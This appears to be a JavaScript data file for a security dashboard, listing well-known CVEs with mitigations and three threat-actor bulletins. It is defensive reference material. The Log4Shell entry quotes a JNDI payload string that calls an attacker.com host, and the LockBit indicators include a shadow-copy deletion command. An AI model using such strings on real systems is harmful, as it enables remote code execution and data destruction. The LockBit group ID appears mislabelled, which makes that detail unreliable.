export const CURATED_CVES = [
    {
        id: "CVE-2024-38077",
        title: "Windows Remote Desktop Licensing Service RCE (MadLicense)",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-122: Heap-based Buffer Overflow",
        published: "2024-07-09",
        vendor: "Microsoft Windows Server",
        summary: "Unauthenticated remote code execution vulnerability in Windows Remote Desktop Licensing Service allowing SYSTEM level command execution over port 135/RPC.",
        mitigation: "Disable RDL licensing service if not strictly required, or apply official Microsoft security update KB5040442.",
        exploit_status: "Public Exploit Available"
    },
    {
        id: "CVE-2024-4577",
        title: "PHP CGI Argument Injection Vulnerability (Windows)",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-88: Command Injection via Best-Fit Mapping",
        published: "2024-06-06",
        vendor: "PHP Group / XAMPP",
        summary: "Character encoding best-fit mapping flaw in PHP-CGI on Windows allowing attackers to bypass argument escaping and achieve arbitrary code execution via soft hyphen injection (%ad).",
        mitigation: "Upgrade PHP to versions 8.3.8+, 8.2.20+, or 8.1.29+. Add RewriteRule in Apache/Nginx to block %ad requests.",
        exploit_status: "Actively Exploited in Wild"
    },
    {
        id: "CVE-2024-3094",
        title: "XZ Utils Backdoor Supply Chain Compromise",
        severity: "CRITICAL",
        cvss: 10.0,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe: "CWE-506: Embedded Malicious Code",
        published: "2024-03-29",
        vendor: "Tukaani XZ / OpenSSH",
        summary: "Malicious backdoor embedded into upstream release tarballs of xz-utils (versions 5.6.0 and 5.6.1) intercepting OpenSSH sshd authentication.",
        mitigation: "Immediately downgrade xz-utils to version 5.4.x across all production Linux distributions.",
        exploit_status: "Weaponized Supply Chain Implant"
    },
    {
        id: "CVE-2024-21762",
        title: "Fortinet FortiOS SSL-VPN Out-of-Bounds Write RCE",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-787: Out-of-bounds Write",
        published: "2024-02-09",
        vendor: "Fortinet FortiOS",
        summary: "Out-of-bounds write vulnerability in FortiOS web interface allows remote unauthenticated attackers to execute arbitrary code via specially crafted HTTP requests.",
        mitigation: "Upgrade FortiOS to 7.4.3+, 7.2.7+, or 7.0.14+. Disable SSL-VPN web portal if unused.",
        exploit_status: "CISA KEV Listed / Actively Exploited"
    },
    {
        id: "CVE-2024-1709",
        title: "ConnectWise ScreenConnect Authentication Bypass",
        severity: "CRITICAL",
        cvss: 10.0,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe: "CWE-288: Authentication Bypass Using an Alternate Path",
        published: "2024-02-19",
        vendor: "ConnectWise ScreenConnect",
        summary: "Setup wizard URI bypass allowing unauthenticated attackers to access administrative setup and configure new system admin accounts.",
        mitigation: "Upgrade ScreenConnect to version 23.9.8 or higher immediately.",
        exploit_status: "Mass Exploitation Observed"
    },
    {
        id: "CVE-2023-4966",
        title: "Citrix Bleed Sensitive Information Disclosure",
        severity: "HIGH",
        cvss: 9.4,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        cwe: "CWE-119: Buffer Over-read",
        published: "2023-10-10",
        vendor: "NetScaler ADC / Gateway",
        summary: "Buffer over-read flaw in NetScaler Gateway allowing extraction of active user session tokens, bypassing MFA requirements.",
        mitigation: "Apply vendor patches and terminate all active user sessions.",
        exploit_status: "Session Hijacking Token Theft"
    },
    {
        id: "CVE-2024-3400",
        title: "Palo Alto Networks PAN-OS Command Injection",
        severity: "CRITICAL",
        cvss: 10.0,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe: "CWE-77: Command Injection",
        published: "2024-04-12",
        vendor: "Palo Alto Networks PAN-OS",
        summary: "Command injection in GlobalProtect feature of PAN-OS allowing unauthenticated remote attackers to execute arbitrary code with root privileges.",
        mitigation: "Apply hotfixes immediately or disable Device Telemetry until upgraded.",
        exploit_status: "Actively Exploited Zero-Day"
    },
    {
        id: "CVE-2023-34362",
        title: "MOVEit Transfer SQL Injection Vulnerability",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-89: SQL Injection",
        published: "2023-06-02",
        vendor: "Progress Software MOVEit",
        summary: "SQL injection in MOVEit Transfer web application leading to unauthenticated database takeover and remote code execution via LemurLOOT webshells.",
        mitigation: "Apply vendor patches, audit guestuser accounts, and check for lemurloot indicators.",
        exploit_status: "Mass Cl0p Ransomware Campaign"
    },
    {
        id: "CVE-2023-23397",
        title: "Microsoft Outlook NTLM Hash Theft Zero-Click",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-200: Information Exposure",
        published: "2023-03-14",
        vendor: "Microsoft Outlook",
        summary: "Zero-click exploit triggered by a crafted calendar invite containing a custom PidLidReminderFileSound path, forcing NTLM authentication to an attacker SMB server.",
        mitigation: "Install official Outlook security updates and block outbound SMB (TCP 445) at the enterprise firewall.",
        exploit_status: "Nation-State Russian GRU Exploited"
    },
    {
        id: "CVE-2021-44228",
        title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        severity: "CRITICAL",
        cvss: 10.0,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe: "CWE-502: Deserialization of Untrusted Data",
        published: "2021-12-10",
        vendor: "Apache Software Foundation",
        summary: "JNDI lookup feature in Log4j2 evaluated attacker-controlled log strings like ${jndi:ldap://attacker.com/a}, executing remote Java classes.",
        mitigation: "Upgrade to Log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true.",
        exploit_status: "Global Internet Mass Exploit"
    },
    {
        id: "CVE-2020-1472",
        title: "Microsoft Active Directory Netlogon Elevation (Zerologon)",
        severity: "CRITICAL",
        cvss: 10.0,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe: "CWE-327: Use of Insecure Cryptographic Algorithm",
        published: "2020-08-11",
        vendor: "Microsoft Windows Server",
        summary: "Flaw in ComputeNetlogonCredential AES-CFB8 implementation allowing unauthenticated attackers to set domain controller machine account password to blank.",
        mitigation: "Deploy Microsoft domain controller security patches enforcing secure RPC.",
        exploit_status: "Full Domain Compromise in Seconds"
    },
    {
        id: "CVE-2017-0144",
        title: "Windows SMBv1 Remote Code Execution (EternalBlue)",
        severity: "CRITICAL",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe: "CWE-119: Buffer Overflow in SMBv1",
        published: "2017-03-14",
        vendor: "Microsoft Windows",
        summary: "Buffer overflow in SMBv1 kernel driver (srv.sys) weaponized by NSA Shadow Brokers and used in WannaCry and NotPetya ransomware worms.",
        mitigation: "Disable SMBv1 across all endpoints and apply MS17-010 security bulletin.",
        exploit_status: "Historic Global Ransomware Worm Vector"
    }
];

export const THREAT_BULLETINS = [
    {
        threat_actor: "Volt Typhoon (BRONZE SILHOUETTE)",
        target_sector: "Critical Infrastructure / Energy / Water",
        primary_technique: "Living-off-the-Land (LOLBins), Router SOHO Proxies",
        mitre_id: "G0135",
        alert_level: "HIGH",
        advisory: "Adversaries maintain stealth persistence using native Windows utilities (wmic, ntdsutil, netsh) avoiding malware binary detection.",
        indicators: ["TCP/8080 C2 proxying", "Port forwarding via netsh interface portproxy", "NTDS.dit volume snapshot staging"]
    },
    {
        threat_actor: "Scattered Spider (UNC3944)",
        target_sector: "Identity Providers, Telecom, Cloud SaaS",
        primary_technique: "SIM Swapping, Helpdesk Social Engineering, MFA Fatigue",
        mitre_id: "G1015",
        alert_level: "CRITICAL",
        advisory: "Specializes in voice phishing helpdesk agents to reset Okta / Azure AD credentials, followed by Okta FastPass phishing and cloud persistence.",
        indicators: ["Anomalous Okta device registrations", "Helpdesk credential reset velocity", "AWS role chaining via SSO"]
    },
    {
        threat_actor: "LockBit 3.0 (Black) Ransomware",
        target_sector: "Healthcare, Manufacturing, Government",
        primary_technique: "StealBit Exfiltration, Cobalt Strike, PsExec Distribution",
        mitre_id: "G0096",
        alert_level: "CRITICAL",
        advisory: "Double extortion ransomware abusing abused valid credentials to deploy encryptors through Group Policy Objects (GPO).",
        indicators: ["vssadmin delete shadows /all /quiet", "GPO script deployment of locker.exe", "Exfiltration to Mega.nz and Wasabi cloud"]
    }
];
